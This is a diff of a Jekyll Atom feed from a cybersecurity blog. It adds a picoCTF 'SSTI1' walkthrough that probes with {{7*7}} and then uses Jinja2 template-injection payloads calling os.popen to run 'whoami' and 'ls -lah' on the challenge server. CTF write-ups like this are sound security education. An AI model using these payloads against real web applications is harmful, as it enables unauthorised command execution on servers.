@@ -1,4 +1,52 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-05-31T14:08:01-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Big Brooklyn</title><subtitle>Cybersecurity Blog + Portfolio</subtitle><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><entry><title type="html">Blame Game (PicoCTF)</title><link href="http://localhost:4000/blog/cybersecurity/2025/05/31/intro.html" rel="alternate" type="text/html" title="Blame Game (PicoCTF)" /><published>2025-05-31T00:00:00-04:00</published><updated>2025-05-31T00:00:00-04:00</updated><id>http://localhost:4000/blog/cybersecurity/2025/05/31/intro</id><content type="html" xml:base="http://localhost:4000/blog/cybersecurity/2025/05/31/intro.html"><![CDATA[<p><img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*p0U9Ynq6xoerzcrMvSEvFw.png" alt="Set up Listener" width="400" style="     display: block;     margin: 50px auto 40px;     border-radius: 18px;     border: 2.5px solid #111; /* crisp black border */     box-shadow: 0 10px 25px rgba(0, 0, 0, 0.12); /* soft black shadow */     transition: transform 0.3s ease, box-shadow 0.3s ease;     cursor: pointer;   " onmouseover="this.style.transform='scale(1.05)'; this.style.boxShadow='0 15px 35px rgba(0, 0, 0, 0.25)';" onmouseout="this.style.transform='scale(1)'; this.style.boxShadow='0 10px 25px rgba(0, 0, 0, 0.12)';" /></p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-05-31T14:26:28-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Big Brooklyn</title><subtitle>Cybersecurity Blog + Portfolio</subtitle><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><entry><title type="html">SSTI1 (PicoCTF)</title><link href="http://localhost:4000/blog/cybersecurity/2025/05/31/SSTI1.html" rel="alternate" type="text/html" title="SSTI1 (PicoCTF)" /><published>2025-05-31T00:00:00-04:00</published><updated>2025-05-31T00:00:00-04:00</updated><id>http://localhost:4000/blog/cybersecurity/2025/05/31/SSTI1</id><content type="html" xml:base="http://localhost:4000/blog/cybersecurity/2025/05/31/SSTI1.html"><![CDATA[<p><img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*DSmBoEWa8L36cCY8PEBX4g.png" alt="Set up Listener" width="400" style="     display: block;     margin: 50px auto 40px;     border-radius: 18px;     border: 2.5px solid #111; /* crisp black border */     box-shadow: 0 10px 25px rgba(0, 0, 0, 0.12); /* soft black shadow */     transition: transform 0.3s ease, box-shadow 0.3s ease;     cursor: pointer;   " onmouseover="this.style.transform='scale(1.05)'; this.style.boxShadow='0 15px 35px rgba(0, 0, 0, 0.25)';" onmouseout="this.style.transform='scale(1)'; this.style.boxShadow='0 10px 25px rgba(0, 0, 0, 0.12)';" /></p>
+
+<h2 id="description">Description</h2>
+
+<blockquote>I made a cool website where you can announce whatever you want! Try it out! I heard templating is a cool and modular way to build web apps!</blockquote>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:613/1*749ohjzhVKocSttt49oQWQ.png" alt="" /></p>
+
+<p>If we type picoCTF, it would show this:</p>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:700/1*We7v-m3zd-UQpEYLKxGCFA.png" alt="" /></p>
+
+<p>Let’s try some template injection, in this case we are going to use this <code class="language-plaintext highlighter-rouge">{{7*7}}</code>:</p>
+
+<p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection?source=post_page-----0853498698d5---------------------------------------">PayloadsAllTheThings/Server Side Template Injection</a></p>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:700/1*p6nuwKmCpJDW8EQ2qJtakA.png" alt="" /></p>
+
+<p>This time, we got <code class="language-plaintext highlighter-rouge">49</code> because <code class="language-plaintext highlighter-rouge">7 × 7 = 49</code>. That means our injection works. Now, let’s try some more advanced injections.</p>
+
+<div class="code-block-container">
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  
+  <pre><code class="language-powershell">{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('whoami').read() }}</code></pre>
+  
+</div>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:700/1*nIEgY-qk-0gDP50LEfcLdQ.png" alt="" /></p>
+
+<div class="code-block-container">
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  
+  <pre><code class="language-powershell">{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls -lah').read() }}</code></pre>
+  
+</div>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:700/1*ppTGzKKyJ-A80GgxnjNRNg.png" alt="" /></p>
+
+<p>Now we can read the flag.</p>]]></content><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><category term="blog" /><category term="cybersecurity" /><category term="red team" /><category term="pentesting" /><category term="bug bounty" /><category term="ctf" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">Blame Game (PicoCTF)</title><link href="http://localhost:4000/blog/cybersecurity/2025/05/31/intro.html" rel="alternate" type="text/html" title="Blame Game (PicoCTF)" /><published>2025-05-31T00:00:00-04:00</published><updated>2025-05-31T00:00:00-04:00</updated><id>http://localhost:4000/blog/cybersecurity/2025/05/31/intro</id><content type="html" xml:base="http://localhost:4000/blog/cybersecurity/2025/05/31/intro.html"><![CDATA[<p><img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*p0U9Ynq6xoerzcrMvSEvFw.png" alt="Set up Listener" width="400" style="     display: block;     margin: 50px auto 40px;     border-radius: 18px;     border: 2.5px solid #111; /* crisp black border */     box-shadow: 0 10px 25px rgba(0, 0, 0, 0.12); /* soft black shadow */     transition: transform 0.3s ease, box-shadow 0.3s ease;     cursor: pointer;   " onmouseover="this.style.transform='scale(1.05)'; this.style.boxShadow='0 15px 35px rgba(0, 0, 0, 0.25)';" onmouseout="this.style.transform='scale(1)'; this.style.boxShadow='0 10px 25px rgba(0, 0, 0, 0.12)';" /></p>
 
 <h2 id="description">Description</h2>
 
